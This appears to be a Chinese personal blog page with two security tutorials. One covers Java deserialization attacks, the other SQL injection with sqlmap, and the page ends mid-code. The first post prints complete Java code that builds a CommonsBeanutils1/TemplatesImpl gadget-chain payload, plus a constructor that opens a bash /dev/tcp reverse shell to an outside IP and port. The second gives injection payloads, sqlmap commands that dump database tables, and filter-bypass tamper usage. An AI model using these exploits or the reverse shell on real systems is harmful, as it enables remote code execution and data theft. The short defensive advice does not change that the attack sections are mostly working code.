<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>笔记本</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="笔记本">
<meta property="og:url" content="http://xiaoyue26.github.io/index.html">
<meta property="og:site_name" content="笔记本">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="风梦七">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="笔记本" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    
  
  
<link rel="stylesheet" href="/css/style.css">

  

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    
    <div id="header-inner" class="inner">
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://xiaoyue26.github.io"></form>
      </div>
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">首页</a>
        
          <a class="main-nav-link" href="/archives">归档</a>
        
          <a class="main-nav-link" href="/about">关于</a>
        
      </nav>
      
    </div>
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">笔记本</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">风梦七</a>
        </h2>
      
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-2022-10/java反序列化攻击-md" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/10/03/2022-10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB-md/" class="article-date">
  <time datetime="2022-10-03T08:56:48.000Z" itemprop="datePublished">2022-10-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/10/03/2022-10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB-md/">java反序列化攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="WHAT-反序列化攻击是什么"><a href="#WHAT-反序列化攻击是什么" class="headerlink" title="WHAT: 反序列化攻击是什么?"></a>WHAT: 反序列化攻击是什么?</h1><p>有些应用可能会把对象序列化成bytes(或者字符串)，然后再反序列化回对象。<br>这个过程中，如果用户能修改序列化后的字符串（或者bytes），就可能注入恶意的代码，从而控制目标机器。</p>
<p>以java为例，可能应用会用<code>writeObject</code>序列化对象成bytes，<br>然后<code>readObject</code>反序列化回对象。如果应用中有这部分逻辑，就得提防反序列化漏洞了。</p>
<h1 id="HOW-怎么构造一个反序列化攻击"><a href="#HOW-怎么构造一个反序列化攻击" class="headerlink" title="HOW: 怎么构造一个反序列化攻击"></a>HOW: 怎么构造一个反序列化攻击</h1><p>除了<code>commons-collections 3.1</code>可以用来利用java反序列化漏洞，还有更多第三方库同样可以用来利用反序列化漏洞并执行任意代码，部分如下：</p>
<blockquote>
<p>commons-fileupload 1.3.1<br>commons-io 2.4<br>commons-collections 3.1<br>commons-logging 1.2<br>commons-beanutils 1.9.2<br>org.slf4j:slf4j-api 1.7.21<br>com.mchange:mchange-commons-java 0.2.11<br>org.apache.commons:commons-collections 4.0<br>com.mchange:c3p0 0.9.5.2<br>org.beanshell:bsh 2.0b5<br>org.codehaus.groovy:groovy 2.3.9</p>
</blockquote>
<h2 id="使用工具构造payload"><a href="#使用工具构造payload" class="headerlink" title="使用工具构造payload"></a>使用工具构造payload</h2><p>可以使用ysoserial: <a href="https://github.com/search?q=ysoserial" target="_blank" rel="noopener">https://github.com/search?q=ysoserial</a><br>在已知目标程序依赖了哪些有漏洞的库的前提下，选择对应类型来生成payload:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'</span><br><span class="line">  Available payload types:</span><br><span class="line">九月 29, 2022 6:36:29 下午 org.reflections.Reflections scan</span><br><span class="line">信息: Reflections took 182 ms to scan 1 urls, producing 18 keys and 153 values</span><br><span class="line">     Payload             Authors                                Dependencies</span><br><span class="line">     -------             -------                                ------------</span><br><span class="line">     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2</span><br><span class="line">     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5</span><br><span class="line">     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0</span><br><span class="line">     Clojure             @JackOfMostTrades                      clojure:1.8.0</span><br><span class="line">     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">     CommonsCollections1 @frohoff                               commons-collections:3.1</span><br><span class="line">     CommonsCollections2 @frohoff                               commons-collections4:4.0</span><br><span class="line">     CommonsCollections3 @frohoff                               commons-collections:3.1</span><br><span class="line">     CommonsCollections4 @frohoff                               commons-collections4:4.0</span><br><span class="line">     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1</span><br><span class="line">     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1</span><br><span class="line">     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br><span class="line">     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">     Groovy1             @frohoff                               groovy:2.3.9</span><br><span class="line">     Hibernate1          @mbechler</span><br><span class="line">     Hibernate2          @mbechler</span><br><span class="line">     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     JRMPClient          @mbechler</span><br><span class="line">     JRMPListener        @mbechler</span><br><span class="line">     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     Jdk7u21             @frohoff</span><br><span class="line">     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2</span><br><span class="line">     MozillaRhino1       @matthias_kaiser                       js:1.7R2</span><br><span class="line">     MozillaRhino2       @_tint0                                js:1.7R2</span><br><span class="line">     Myfaces1            @mbechler</span><br><span class="line">     Myfaces2            @mbechler</span><br><span class="line">     ROME                @mbechler                              rome:1.0</span><br><span class="line">     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">     URLDNS              @gebl</span><br><span class="line">     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14</span><br><span class="line">     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></table></figure>

<p>比如如果已知目标程序依赖了<code>CommonsBeanutils1</code>对应的依赖<code>commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</code>，<br>则可以：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 'curl 172.20.26.42:8081' | base64</span><br></pre></td></tr></table></figure>
<p>生成执行base64的payload。</p>
<h2 id="手动构造"><a href="#手动构造" class="headerlink" title="手动构造"></a>手动构造</h2><p>可以参考：<a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p>
<p>手动构造需要写代码，比较繁琐。所以我们以简化的情景来假设。<br>假设我们直接有了目标程序的jar包，则可以解压得到依赖库(lib目录)，然后新建一个Java项目，把依赖jar包全导入进去。<br>假设目标程序依赖了<code>commons-beanutils-1.9.2</code>，我们从mvn核心库可以看到它存在CVE:<br><a href="https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils/1.9.2" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils/1.9.2</a></p>
<img src="/images/2022-10/cve.png" class="" width="800" height="1200" title="cve">

<p>mvn中央仓库专门有一列<code>Vulnerabilities</code>来标示存在<code>vulnerability</code>(弱点、漏洞)的库版本。<br>(类似于sqlmap中提示某字段是vulnerable的)</p>
<blockquote>
<p>CVE(Common Vulnerabilities &amp; Exposures): 漏洞编号，大家约定的、这个漏洞的名字；<br>PoC(Proof of concept): （概念验证）漏洞证明<br>vul(Vulnerability): 泛指漏洞<br>exp: 漏洞利用，一般是个demo程序</p>
</blockquote>
<p>根据参考资料，我们可以用<code>BeanComparator</code>来构造一个反序列化的攻击。<br>创建一个优先队列，把<code>Comparator</code>设置成<code>BeanComparator</code>，然后塞进2个元素，再强行通过反射换掉元素。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.comparator.BooleanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printPayload</span><span class="params">(<span class="keyword">byte</span>[] clazzBytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, BooleanComparator.TRUE_HIGH);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="keyword">false</span>);</span><br><span class="line">        queue.add(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">"queue"</span>, <span class="keyword">new</span> Object[] &#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        write(queue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        System.out.println(<span class="string">"base64:"</span>);</span><br><span class="line">        String base64Str = <span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class="line">        System.out.println(base64Str);</span><br><span class="line">        System.out.println(<span class="string">"base64 end"</span>);</span><br><span class="line"></span><br><span class="line">        tryDecode(base64Str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tryDecode</span><span class="params">(String base64Str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] res = Base64.getDecoder().decode(base64Str.getBytes());</span><br><span class="line">        InputStream in = <span class="keyword">new</span> ByteArrayInputStream(res);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(HelloTemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        printPayload(clazz.toBytecode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上所示我们就可以注入任意想要执行的代码(<code>HelloTemplatesImpl</code>)了。</p>
<p>譬如我们可以在它的构造函数里放入想要执行的恶意代码(反向shell):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTemplatesImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"Hello TemplatesImpl"</span>);</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        Process p;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p = r.exec(<span class="keyword">new</span> String[] &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>,</span><br><span class="line">                    <span class="string">"exec 5&lt;&gt;/dev/tcp/172.29.53.149/5279;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"End TemplatesImpl"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h1><p>1。对于依赖的库，定期在mvn中心仓库检查<code>Vulnerabilities</code>列，如果有CVE，尽量及早升级到安全版本；<br>2。尽量不反序列化生成对象；<br>3。不要信任用户输入；</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a><br><a href="https://github.com/phith0n/JavaThings/blob/master/shiroattack/src/main/java/com/govuln/shiroattack/CommonsBeanutils1Shiro.java" target="_blank" rel="noopener">https://github.com/phith0n/JavaThings/blob/master/shiroattack/src/main/java/com/govuln/shiroattack/CommonsBeanutils1Shiro.java</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2022/10/03/2022-10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB-md/" data-id="cl8zaqgfs0000z9am8327a4ri" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-09/sql注入攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/09/27/2022-09/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" class="article-date">
  <time datetime="2022-09-27T10:55:35.000Z" itemprop="datePublished">2022-09-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a>►<a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/09/27/2022-09/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">sql注入攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="WHAT-sql注入是什么"><a href="#WHAT-sql注入是什么" class="headerlink" title="WHAT: sql注入是什么"></a>WHAT: sql注入是什么</h1><p>在输入的字符串之中注入SQL指令。<br>如果代码中是以拼接用户输入成一个sql交给数据库执行的话，就很容易被此类攻击攻破。</p>
<h1 id="HOW-sql注入如何发生"><a href="#HOW-sql注入如何发生" class="headerlink" title="HOW: sql注入如何发生"></a>HOW: sql注入如何发生</h1><p>假如代码中的拼接逻辑:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = <span class="string">"SELECT * FROM users WHERE (name = '"</span> + userName + <span class="string">"') and (pw = '"</span>+ passWord +<span class="string">"');"</span></span><br></pre></td></tr></table></figure>
<p>然后用户输入:<code>userName = &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;;</code><br>则拼接后的结果:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>) <span class="keyword">and</span> (pw = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>);"</span><br></pre></td></tr></table></figure>
<p>则sql实际逻辑发生了变化，执行了用户注入的逻辑。<br>攻击方不一定需要从回显中获取信息，只需要通过sleep函数即可通过时间差进行盲注。<br>大致攻击逻辑：<br>1。通过拼接sleep判断是否存在被注入点；<br>2。通过拼接逻辑运算+sleep判断（逻辑短路）判断某个条件是否成立；<br>（比如 某个表是否存在、表名的每一位字母是否正确来慢慢试探出表名）</p>
<h1 id="sqlmap工具"><a href="#sqlmap工具" class="headerlink" title="sqlmap工具"></a>sqlmap工具</h1><p>首先正常请求一次目标，然后将request header和payload保存到<code>1.txt</code>中，然后就可以用sqlmap来进行盲注了。</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 首先探测有哪些数据库:</span></span><br><span class="line">sqlmap -r 1.txt --level 3 --risk 3 --dbs</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 探测有哪些表:</span></span><br><span class="line">sqlmap -r 1.txt --level 3 --risk 3 -D 上一步的db --tables</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 打印指定easysql库下flag表的数据:</span></span><br><span class="line">sqlmap -r 1.txt --level 5 --risk 3 -D easysql -T flag --dump</span><br></pre></td></tr></table></figure>
<p>有时候会遇到目标服务器有一些简单的字符串过滤、拦截的逻辑，可以通过加tamper的方式绕过:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt  --tamper "easysql.py" --level 5 --risk 3 -D easysql --tables</span><br></pre></td></tr></table></figure>
<p>tamper有到的文件位于:<br><code>/Library/Python/3.7/site-packages/sqlmap/tamper/</code>目录下，可以通过<code>locate space2comment.py</code>来寻找对应目录。</p>
<p>打印指定列:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 2.txt -D ctf -T user -C "username,password" <span class="comment">--dump -D easysql --tables</span></span><br></pre></td></tr></table></figure>

<h2 id="自己编写tamper"><a href="#自己编写tamper" class="headerlink" title="自己编写tamper"></a>自己编写tamper</h2><p>主要是实现一个<code>def tamper(payload, **kwargs)</code>方法:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span 